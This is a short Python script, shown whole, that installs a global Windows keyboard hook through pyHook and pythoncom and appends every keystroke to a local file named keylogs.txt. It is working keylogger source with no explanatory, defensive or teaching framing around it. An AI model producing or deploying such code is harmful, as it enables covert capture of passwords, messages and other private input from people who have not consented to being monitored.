```python
import pythoncom
from pyHook import HookManager, KeyboardEvent
import datetime

def OnKeyboardEvent(event):
    if event.Ascii > 0:
        with open("keylogs.txt", "a") as f:
            f.write(chr(event.Ascii))
    else:
        with open("keylogs.txt", "a") as f:
            f.write(str(event))
    return True

hm = HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
```